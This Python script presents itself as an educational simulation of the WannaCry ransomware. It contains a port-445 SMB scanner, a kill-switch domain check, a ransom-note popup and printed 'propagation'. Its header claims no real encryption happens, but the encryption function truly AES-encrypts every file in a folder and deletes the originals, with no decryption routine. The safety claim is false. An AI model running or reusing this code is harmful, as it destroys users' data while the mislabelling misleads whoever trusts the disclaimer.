# This code simulates the WannaCry ransomware attack for educational purposes only.
# It does not perform any real encryption or malicious actions.
# Always use caution and ensure you have permission to test any systems.
# This script is intended for educational and research purposes only.
# Do not use it for illegal activities.     

import os
import sys
import socket
import logging
from time import sleep
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from tkinter import messagebox, Tk

# Setup logging
logging.basicConfig(filename='simulation.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# --- MS17-010 Scanner Simulation ---

def scan_target(ip, port=445):
    print(f"[*] Scanning {ip}:{port} for SMBv1 (MS17-010) vulnerability...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))

        if result == 0:
            print(f"[+] Port 445 is OPEN on {ip}")
            msg = f"Simulated SMBv1 detected on {ip} (Potentially vulnerable to MS17-010)"
            print("[!]", msg)
            logging.info(msg)
        else:
            print(f"[-] Port 445 is CLOSED on {ip}")
            logging.info(f"Port 445 closed on {ip}")

        sock.close()
    except socket.error as e:
        msg = f"Could not connect to {ip}: {e}"
        print("[-]", msg)
        logging.error(msg)

# --- Kill-Switch Domain Check ---

def check_kill_switch(domain):
    try:
        host = socket.gethostbyname(domain)
        msg = f"Kill-Switch Domain is Active: {domain} -> {host}"
        print("[*]", msg)
        logging.info(msg)
        return True
    except socket.error:
        msg = f"Kill-Switch Domain is Not Active: {domain}"
        print("[*]", msg)
        logging.info(msg)
        return False

# --- AES Encryption (Simulation) ---

def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()

        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        encrypted_file = filepath + ".locked"
        with open(encrypted_file, 'wb') as f:
            f.write(cipher.nonce + tag + ciphertext)

        os.remove(filepath)

        msg = f"Encrypted: {filepath} -> {encrypted_file}"
        print("[+]", msg)
        logging.info(msg)
    except Exception as e:
        msg = f"Failed to encrypt {filepath}: {e}"
        print("[-]", msg)
        logging.error(msg)

def simulate_encryption(target_dir):
    if not os.path.isdir(target_dir):
        msg = f"Target directory '{target_dir}' does not exist."
        print("[-]", msg)
        logging.error(msg)
        return

    key = get_random_bytes(16)
    print("[!]", f"AES Encryption Key (Simulated): {key.hex()}")
    logging.info(f"AES Encryption Key (Simulated): {key.hex()}")

    for filename in os.listdir(target_dir):
        filepath = os.path.join(target_dir, filename)
        if os.path.isfile(filepath) and not filename.endswith(".locked"):
            encrypt_file(filepath, key)

# --- Ransom Note (Fake GUI) ---

def show_ransom_note():
    note = """
    Ooops, your files have been encrypted!

    What Happened to My Computer?
    Your important files are encrypted. If you want to decrypt them,
    you need to pay a ransom in Bitcoin.

    (Simulation Only — No Real Encryption)
    """
    root = Tk()
    root.withdraw()
    messagebox.showwarning("WannaCry Ransomware Simulation", note)
    root.mainloop()

# --- Fake Propagation Simulation ---

def simulate_propagation(target_ips):
    print("[*] Simulating propagation to target IPs...")
    for ip in target_ips:
        msg = f"Pretending to propagate to {ip}..."
        print("[~]", msg)
        logging.info(msg)
        sleep(1)

# --- Main Program ---

def main():
    print("=== WannaCry PoC Full Simulator ===")

    # Hardcoded input values (you can still change these if needed)
    target_folder = r"C:\Users\testlab\Desktop\test1"
    kill_switch_domain = "examplekillswitch.com"
    target_ip = "192.168.153.128"

    while True:
        print("\n--- Simulation Menu ---")
        print(f"Target Folder: {target_folder}")
        print(f"Kill-Switch Domain: {kill_switch_domain}")
        print(f"Target IP: {target_ip}")
        print("------------------------")
        print("1. Scan target IP for SMBv1 (MS17-010)")
        print("2. Check kill-switch domain")
        print("3. Simulate AES file encryption")
        print("4. Show ransomware popup note")
        print("5. Simulate propagation")
        print("6. Run full simulation")
        print("0. Exit")
        
        choice = input("Enter your choice (0-6): ").strip()

        if choice == "1":
            scan_target(target_ip)

        elif choice == "2":
            check_kill_switch(kill_switch_domain)

        elif choice == "3":
            simulate_encryption(target_folder)

        elif choice == "4":
            show_ransom_note()

        elif choice == "5":
            simulate_propagation([target_ip])

        elif choice == "6":
            scan_target(target_ip)
            if check_kill_switch(kill_switch_domain):
                print("[!] Kill-Switch Activated. Simulation Aborted.")
                logging.info("Simulation aborted due to active kill-switch.")
            else:
                print("[!] Kill-Switch Not Active. Proceeding with Simulation...")
                logging.info("Kill-switch not active. Continuing simulation.")
                simulate_encryption(target_folder)
                show_ransom_note()
                simulate_propagation([target_ip])

        elif choice == "0":
            print("Exiting simulation.")
            break

        else:
            print("Invalid choice. Please enter a number from 0 to 6.")


if __name__ == "__main__":
    main()
